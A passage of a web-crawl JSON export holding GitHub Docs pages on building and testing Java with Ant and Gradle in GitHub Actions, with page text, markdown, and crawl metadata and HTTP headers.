      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-secrets-in-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 20206,
      "readableText": 18696,
      "none": 51122,
      "readableTextIfPossible": 18696,
      "result": 18696,
      "markdown": 14390
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant",
    "loadedTime": "2025-05-08T06:37:40.420Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant",
    "title": "Building and testing Java with Ant - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Ant.",
    "author": null,
    "keywords": "CI,Java,Ant",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Java with Ant - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "9E0C:1F5A:3064:423E:681C512E",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:34 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686254.232348, VS0, VE280",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27593",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Java with Ant\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Ant.\nIntroduction\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Ant build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to upload artifacts from a workflow run.\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Ant. For a list of software and the pre-installed versions for JDK and Ant, see Using GitHub-hosted runners.\nPrerequisites\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\nWorkflow syntax for GitHub Actions\nWriting workflows\nWe recommend that you have a basic understanding of Java and the Ant framework. For more information, see the Apache Ant Manual.\nUsing an Ant workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a workflow template for Ant that should work for most Java with Ant projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Ant\".\nOn the \"Java with Ant\" workflow, click Configure.\nEdit the workflow as required. For example, change the Java version.\nClick Commit changes.\nThe ant.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying the Java version and architecture\nThe workflow template sets up the PATH to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64 or x86), you can use the setup-java action to choose a different Java runtime environment.\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the setup-java action and configure the java-version, distribution and architecture parameters to '11', 'temurin' and x64.\nYAML\nsteps: - uses: actions/checkout@v4 - name: Set up JDK 11 for x64 uses: actions/setup-java@v4 with: java-version: '11' distribution: 'temurin' architecture: x64 \nFor more information, see the setup-java action.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code.\nThe workflow template will run the default target specified in your build.xml file. Your default target will commonly be set to build classes, run tests and package classes into their distributable format, for example, a JAR file.\nIf you use different commands to build your project, or you want to run a different target, you can specify those. For example, you may want to run the jar target that's configured in your build-ci.xml file.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - name: Run the Ant jar target run: ant -noinput -buildfile build-ci.xml jar \nPackaging workflow data as artifacts\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see Storing and sharing data from a workflow.\nAnt will usually create output files like JARs, EARs, or WARs in the build/jar directory. You can upload the contents of that directory using the upload-artifact action.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - run: ant -noinput -buildfile build.xml - uses: actions/upload-artifact@v4 with: name: Package path: build/jar",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-pmqvc.html",
  "markdown": "# Building and testing Java with Ant\n\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Ant.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Ant build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to upload artifacts from a workflow run.\n\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Ant. For a list of software and the pre-installed versions for JDK and Ant, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\n\n*   [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)\n*   [Writing workflows](https://docs.github.com/en/actions/learn-github-actions)\n\nWe recommend that you have a basic understanding of Java and the Ant framework. For more information, see the [Apache Ant Manual](https://ant.apache.org/manual/).\n\n## [Using an Ant workflow template](#using-an-ant-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for Ant that should work for most Java with Ant projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Ant\".\n    \n5.  On the \"Java with Ant\" workflow, click **Configure**.\n    \n6.  Edit the workflow as required. For example, change the Java version.\n    \n7.  Click **Commit changes**.\n    \n    The `ant.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n### [Specifying the Java version and architecture](#specifying-the-java-version-and-architecture)\n\nThe workflow template sets up the `PATH` to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (`x64` or `x86`), you can use the `setup-java` action to choose a different Java runtime environment.\n\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the `setup-java` action and configure the `java-version`, `distribution` and `architecture` parameters to `'11'`, `'temurin'` and `x64`.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64\n```\n\nFor more information, see the [`setup-java`](https://github.com/actions/setup-java) action.\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code.\n\nThe workflow template will run the default target specified in your `build.xml` file. Your default target will commonly be set to build classes, run tests and package classes into their distributable format, for example, a JAR file.\n\nIf you use different commands to build your project, or you want to run a different target, you can specify those. For example, you may want to run the `jar` target that's configured in your `build-ci.xml` file.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Ant jar target\n    run: ant -noinput -buildfile build-ci.xml jar\n```\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts).\n\nAnt will usually create output files like JARs, EARs, or WARs in the `build/jar` directory. You can upload the contents of that directory using the `upload-artifact` action.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - run: ant -noinput -buildfile build.xml\n  - uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: build/jar\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-ant-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 8333,
      "readableText": 7808,
      "none": 31138,
      "readableTextIfPossible": 7808,
      "result": 7808,
      "markdown": 5404
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle",
    "loadedTime": "2025-05-08T06:37:42.026Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle",
    "title": "Building and testing Java with Gradle - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Gradle.",
    "author": null,
    "keywords": "CI,Java,Gradle",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Java with Gradle - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "D316:1FDC29:F21467:1392519:681C512F",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:36 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686255.420408, VS0, VE671",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28680",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Java with Gradle\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Gradle.\nIntroduction\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Gradle build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run.\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Gradle. For a list of software and the pre-installed versions for JDK and Gradle, see Using GitHub-hosted runners.\nPrerequisites\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\nWorkflow syntax for GitHub Actions\nWriting workflows\nWe recommend that you have a basic understanding of Java and the Gradle framework. For more information, see the Gradle User Manual.\nUsing a Gradle workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a workflow template for Gradle that should work for most Java with Gradle projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Gradle\".\nOn the \"Java with Gradle\" workflow, click Configure. This workflow performs the following steps:\nChecks out a copy of project's repository.\nSets up the Java JDK.\nSets up the Gradle environment. The gradle/actions/setup-gradle action takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.\nThe \"Build with Gradle\" step executes the build task using the Gradle Wrapper.\nEdit the workflow as required. For example, change the Java version.\nNote\nThis workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.\nIf you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, see Security hardening for GitHub Actions.\nClick Commit changes.\nThe gradle.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying the Java version and architecture\nThe workflow template sets up the PATH to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64 or x86), you can use the setup-java action to choose a different Java runtime environment.\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the setup-java action and configure the java-version, distribution and architecture parameters to '11', 'temurin' and x64.\nYAML\nsteps: - uses: actions/checkout@v4 - name: Set up JDK 11 for x64 uses: actions/setup-java@v4 with: java-version: '11' distribution: 'temurin' architecture: x64 \nFor more information, see the setup-java action.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code.\nThe workflow template will run the build task by default. In the default Gradle configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file.\nIf you use different commands to build your project, or you want to use a different task, you can specify those. For example, you may want to run the package task that's configured in your ci.gradle file.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - name: Setup Gradle uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0 - name: Build with Gradle run: ./gradlew -b ci.gradle package \nCaching dependencies\nYour build dependencies can be cached to speed up your workflow runs. After a successful run, gradle/actions/setup-gradle caches important parts of the Gradle user home directory. In future jobs, the cache will be restored so that build scripts won't need to be recompiled and dependencies won't need to be downloaded from remote package repositories.\nCaching is enabled by default when using the gradle/actions/setup-gradle action. For more information, see gradle/actions/setup-gradle.\nPackaging workflow data as artifacts\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see Storing and sharing data from a workflow.\nGradle will usually create output files like JARs, EARs, or WARs in the build/libs directory. You can upload the contents of that directory using the upload-artifact action.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - name: Setup Gradle uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0 - name: Build with Gradle run: ./gradlew build - name: Upload build artifacts uses: actions/upload-artifact@v4 with: name: Package path: build/libs",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-ezz5a.html",
  "markdown": "# Building and testing Java with Gradle\n\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Gradle.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Gradle build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run.\n\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Gradle. For a list of software and the pre-installed versions for JDK and Gradle, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\n\n*   [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)\n*   [Writing workflows](https://docs.github.com/en/actions/learn-github-actions)\n\nWe recommend that you have a basic understanding of Java and the Gradle framework. For more information, see the [Gradle User Manual](https://docs.gradle.org/current/userguide/userguide.html).\n\n## [Using a Gradle workflow template](#using-a-gradle-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for Gradle that should work for most Java with Gradle projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Gradle\".\n    \n5.  On the \"Java with Gradle\" workflow, click **Configure**. This workflow performs the following steps:\n    \n6.  Checks out a copy of project's repository.\n    \n7.  Sets up the Java JDK.\n    \n8.  Sets up the Gradle environment. The [`gradle/actions/setup-gradle`](https://github.com/gradle/actions) action takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.\n    \n9.  The \"Build with Gradle\" step executes the `build` task using the [Gradle Wrapper](https://docs.gradle.org/current/userguide/gradle_wrapper.html).\n    \n10.  Edit the workflow as required. For example, change the Java version.\n    \n    Note\n    \n    *   This workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.\n    *   If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions).\n    \n11.  Click **Commit changes**.\n    \n    The `gradle.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n### [Specifying the Java version and architecture](#specifying-the-java-version-and-architecture)\n\nThe workflow template sets up the `PATH` to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (`x64` or `x86`), you can use the `setup-java` action to choose a different Java runtime environment.\n\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the `setup-java` action and configure the `java-version`, `distribution` and `architecture` parameters to `'11'`, `'temurin'` and `x64`.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64\n```\n\nFor more information, see the [`setup-java`](https://github.com/actions/setup-java) action.\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code.\n\nThe workflow template will run the `build` task by default. In the default Gradle configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file.\n\nIf you use different commands to build your project, or you want to use a different task, you can specify those. For example, you may want to run the `package` task that's configured in your `ci.gradle` file.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew -b ci.gradle package\n```\n\n## [Caching dependencies](#caching-dependencies)\n\nYour build dependencies can be cached to speed up your workflow runs. After a successful run, `gradle/actions/setup-gradle` caches important parts of the Gradle user home directory. In future jobs, the cache will be restored so that build scripts won't need to be recompiled and dependencies won't need to be downloaded from remote package repositories.\n\nCaching is enabled by default when using the `gradle/actions/setup-gradle` action. For more information, see [`gradle/actions/setup-gradle`](https://github.com/gradle/actions/blob/main/setup-gradle/README.md#caching-build-state-between-jobs).\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts).\n\nGradle will usually create output files like JARs, EARs, or WARs in the `build/libs` directory. You can upload the contents of that directory using the `upload-artifact` action.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew build\n\n  - name: Upload build artifacts\n    uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: build/libs\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 250,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-gradle-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 11181,
      "readableText": 10464,
      "none": 34580,
      "readableTextIfPossible": 10464,
      "result": 10464,
      "markdown": 7617
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action",
    "loadedTime": "2025-05-08T06:37:45.518Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action",
    "title": "Developing a third party CLI action - GitHub Docs",
    "description": "Learn how to develop an action to set up a CLI on GitHub Actions runners.",
    "author": null,
    "keywords": "Actions",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Developing a third party CLI action - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/developing-a-third-party-cli-action"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
